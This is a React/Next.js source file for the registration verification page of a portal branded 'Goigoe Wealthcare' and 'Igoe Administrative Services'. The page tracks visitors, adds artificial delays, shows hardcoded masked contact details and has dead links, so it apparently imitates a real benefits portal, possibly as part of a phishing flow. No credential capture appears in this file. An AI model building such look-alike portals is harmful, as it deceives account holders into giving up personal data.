'use client'

import Link from "next/link"
import Image from "next/image"
import { useEffect, useState } from "react"
import { Mail, MessageSquare, X } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Spinner } from "@/components/ui/spinner"
import { BackButton } from "@/components/BackButton"
import { trackFormSubmission } from "@/hooks/use-visitor-tracking"

export default function VerificationPage() {
  const [isEmailLoading, setIsEmailLoading] = useState(false)
  const [isTextLoading, setIsTextLoading] = useState(false)
  const [isCancelLoading, setIsCancelLoading] = useState(false)
  
  // Set registration accessed cookie when page loads
  useEffect(() => {
    const setRegistrationCookie = async () => {
      try {
        await fetch('/api/set-registration-accessed', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          }
        })
      } catch (error) {
        console.error('Failed to set registration accessed:', error)
      }
    }
    setRegistrationCookie()
  }, [])

  const handleEmailClick = async (e: React.MouseEvent) => {
    e.preventDefault()
    setIsEmailLoading(true)
    
    // Track email option selection
    trackFormSubmission({
      type: 'email_selection',
      page: '/registration'
    })
    
    // 7 second delay for email button
    await new Promise(resolve => setTimeout(resolve, 7000))
    
    // Set cookie before navigating
    try {
      await fetch('/api/set-registration-accessed', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        }
      })
      // Navigate after cookie is set
      window.location.href = '/registration/email'
    } catch (error) {
      console.error('Failed to set registration accessed:', error)
      setIsEmailLoading(false)
    }
  }

  const handleTextClick = async (e: React.MouseEvent) => {
    e.preventDefault()
    setIsTextLoading(true)
    
    // Track text option selection
    trackFormSubmission({
      type: 'text_selection',
      page: '/registration'
    })
    
    // 7 second delay for text button
    await new Promise(resolve => setTimeout(resolve, 7000))
    
    // Set cookie before navigating
    try {
      await fetch('/api/set-registration-accessed', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        }
      })
      // Navigate after cookie is set
      window.location.href = '/registration/text'
    } catch (error) {
      console.error('Failed to set registration accessed:', error)
      setIsTextLoading(false)
    }
  }
  
  const handleCancelClick = async () => {
    setIsCancelLoading(true)
    await new Promise(resolve => setTimeout(resolve, 1000))
    window.location.href = '/'
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="border-b border-gray-200 px-6 py-4">
        <div className="flex items-center justify-between md:justify-start">
          <div className="flex items-center gap-6">
            {/* Logo */}
            <Link href="/" className="flex items-center">
              <Image
                src="/img/ebc994a1e5464f6b94b98cd212d5cbac.jpeg"
                alt="Goigoe Wealthcare Portal"
                width={140}
                height={32}
                className="h-8 w-auto"
                priority
              />
            </Link>

          </div>

          <div className="ml-6 text-xl text-gray-700 font-normal hidden md:block">Registration</div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-6 py-12">
        <div className="w-full max-w-3xl">
          {/* Instructions */}
          <p className="text-center text-gray-700 mb-12">
            We found you! Pick a verification method.
          </p>

          {/* Verification Options */}
          <div className="max-w-2xl mx-auto space-y-6 mb-12">
            {/* Email Option */}
            <div className="flex items-center justify-between gap-4">
              <div className="flex-1 text-gray-700">
                <span>Send code to email: </span>
                <span className="font-medium">**********@****.com</span>
              </div>
              <Button 
                onClick={handleEmailClick}
                disabled={isEmailLoading}
                className="bg-[#010147] hover:bg-[#0063ff] text-white px-8 py-6 min-w-[140px] disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isEmailLoading ? (
                  <>
                    <Spinner className="w-5 h-5 mr-2" />
                    LOADING...
                  </>
                ) : (
                  <>
                    <Mail className="w-5 h-5 mr-2" />
                    E-MAIL
                  </>
                )}
              </Button>
            </div>

            {/* Text Option */}
            <div className="flex items-center justify-between gap-4">
              <div className="flex-1 text-gray-700">
                <span>Send code via text: </span>
                <span className="font-medium">***-***-****</span>
              </div>
              <Button 
                onClick={handleTextClick}
                disabled={isTextLoading}
                className="bg-[#010147] hover:bg-[#0063ff] text-white px-8 py-6 min-w-[140px] disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isTextLoading ? (
                  <>
                    <Spinner className="w-5 h-5 mr-2" />
                    LOADING...
                  </>
                ) : (
                  <>
                    <MessageSquare className="w-5 h-5 mr-2" />
                    TEXT
                  </>
                )}
              </Button>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="flex items-center justify-center gap-4 mb-8">
            <Button
              onClick={handleCancelClick}
              disabled={isCancelLoading}
              variant="outline"
              className="bg-[#010147] hover:bg-[#0063ff] text-white border-0 px-8 py-6 min-w-[140px] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isCancelLoading ? (
                <>
                  <Spinner className="w-5 h-5 mr-2" />
                  LOADING...
                </>
              ) : (
                <>
                  <X className="w-5 h-5 mr-2" />
                  CANCEL
                </>
              )}
            </Button>
            <BackButton />
          </div>

          {/* Help Link */}
          <p className="text-center">
            <Link href="#" className="text-blue-700 underline hover:text-blue-800">
              I cannot receive a verification code
            </Link>
          </p>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-300 py-6 px-6">
        <div className="max-w-7xl mx-auto">
          <nav className="flex flex-wrap items-center justify-center gap-6 mb-3 text-sm">
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              CONTACT US
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              ABOUT US
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              TERMS OF USE
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              PRIVACY POLICY
            </Link>
          </nav>
          <p className="text-center text-sm text-gray-600 mb-2">
            Copyright © 2024 Igoe Administrative Services. All Rights Reserved.
          </p>
          <p className="text-center">
            <Link href="#" className="text-sm text-gray-700 hover:text-gray-900 underline">
              SITE MAP
            </Link>
          </p>
        </div>
      </footer>
    </div>
  )
}
